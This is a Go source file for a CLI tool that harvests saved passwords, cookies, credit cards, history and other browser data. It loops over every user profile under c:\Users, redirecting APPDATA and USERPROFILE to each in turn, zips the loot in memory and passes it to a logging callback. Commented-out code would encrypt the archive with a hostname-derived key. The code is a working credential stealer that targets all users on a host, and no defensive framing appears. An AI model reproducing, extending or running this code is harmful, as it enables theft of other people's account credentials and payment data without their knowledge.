package run

import (
    "archive/zip"
    "bytes"
    "fmt"
    "os"
    "tests/browser"
    "tests/log"
    "tests/utils/fileutil"
    "tests/utils/stringutil"
    "time"

    "github.com/urfave/cli/v2"
)

var (
    browserName  string
    outputDir    string
    outputFormat string
    verbose      bool
    compress     bool
    profilePath  string
    isFullExport bool
)

var (
    MasterKey      = ""
    Username       = ""
    LibProfilePath = ""
    LibBrowserName = ""
    LibHome        = ""
)

func Execute() {
    app := &cli.App{
        Name:      "tools",
        Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
        UsageText: "[tools -b chrome -f json -dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser",
        Version:   "0.5.0",
        Flags: []cli.Flag{
            &cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
            &cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
            &cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
            &cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
            &cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "json", Usage: "output format: csv|json"},
            &cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
            &cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
        },
        HideHelpCommand: true,
        Action: func(c *cli.Context) error {

            log.LogInfo("start collect data")
            if verbose {
                log.SetVerbose()
                //logger.Default.SetVerbose()
                //logger.Configure(logger.Default)
            }
            if LibProfilePath != "" {
                profilePath = LibProfilePath
                browserName = LibBrowserName
            }
            home := `c:\Users`
            foundAll := true
            if LibHome != "" {
                foundAll = false
            }
            usernames := make([]string, 0)
            userNameWhiteList := []string{"default", "public"}
            if foundAll {
                entries, err := os.ReadDir(home)
                if err != nil {
                    return err
                }
            dirLoop:
                for _, entry := range entries {
                    if !entry.IsDir() {
                        continue
                    }
                    for _, white := range userNameWhiteList {
                        if stringutil.CompareIgnoreCase(white, entry.Name()) {
                            continue dirLoop
                        }
                    }
                    usernames = append(usernames, entry.Name())
                }
            } else {
                home = LibHome
                usernames = append(usernames, Username)
            }

            oldAppdata := os.Getenv("APPDATA")
            oldUserProfile := os.Getenv("USERPROFILE")

            outBuffer := bytes.Buffer{}
            zw := zip.NewWriter(&outBuffer)

            for _, username := range usernames {
                if !foundAll {
                    os.Setenv("APPDATA", fmt.Sprintf(`%s\AppData\Roaming`, home))
                    os.Setenv("USERPROFILE", fmt.Sprintf(`%s`, home))
                } else {
                    os.Setenv("APPDATA", fmt.Sprintf(`%s\%s\AppData\Roaming`, home, username))
                    os.Setenv("USERPROFILE", fmt.Sprintf(`%s\%s`, home, username))
                }

                log.LogInfo(fmt.Sprintf("set user profile and appdata for [%s]", username))
                time.Sleep(time.Second)
                home2, _ := os.UserHomeDir()
                browser.RefreshConfig(home2)

                //if stringutil.CompareIgnoreCase(username, "administrator") && Username != ""{
                //    username
                //}

                browsers, err := browser.PickBrowsers(browserName, profilePath)
                if err != nil {
                    log.LogErr(fmt.Sprintf("pick [%s] browsers error: %s", username, err.Error()))
                    log.Errorf("pick [%s] browsers %v", username, err)
                    continue
                } else {
                    log.LogSuccess(fmt.Sprintf("[%s] PickBrowsers success", username))
                }
                time.Sleep(time.Second)

                for _, b := range browsers {
                    log.LogSuccess(fmt.Sprintf("get [%s] browsing %s data", username, b.Name()))
                    if Username != "" {
                        username = Username
                    }
                    data, err := b.BrowsingData(isFullExport, username, nil)
                    if err != nil {
                        log.LogErr(fmt.Sprintf("get [%s] browsing data error: %s", username, err.Error()))
                        log.Errorf("get [%s] browsing data error %v", username, err)
                        continue
                    }
                    data.Output(zw, username, b.Name(), outputFormat)
                }
            }
            zw.Close()
            log.LogInfo("over collect data")

            os.Setenv("APPDATA", oldAppdata)
            os.Setenv("USERPROFILE", oldUserProfile)
            log.LogInfo("recovery user profile and appdata")
            //host, _ := os.Hostname()
            //out := crypto.AESEncrypt(outBuffer.Bytes(), []byte(host))
            //outName := uuid.New().String()
            log.LogSuccess("recv browser data start")
            b := outBuffer.Bytes()
            log.LogBytes(b, len(b))

            log.LogSuccess("recv browser data success")

            time.Sleep(time.Second * 5)

            //if err = os.WriteFile(outName, out, 666); err != nil {
            //    slog.Error("write zip error: ", "err", err)
            //} else {
            //    if tmp, err := filepath.Abs(outName); err == nil {
            //        outName = tmp
            //    }
            //    msg := "save success,out: " + outName
            //    if LogCallback != nil {
            //        LogCallback(1, "save success,out: "+outName, 0)
            //    }
            //    slog.Warn(msg)
            //}

            if compress {
                if err := fileutil.CompressDir(outputDir); err != nil {
                    log.Errorf("compress error %v", err)
                }
                log.Debug("compress success")
            }
            return nil
        },
    }
    err := app.Run(os.Args)
    if err != nil {
        log.LogErr(fmt.Sprintf("run app error %v", err))
    }
}
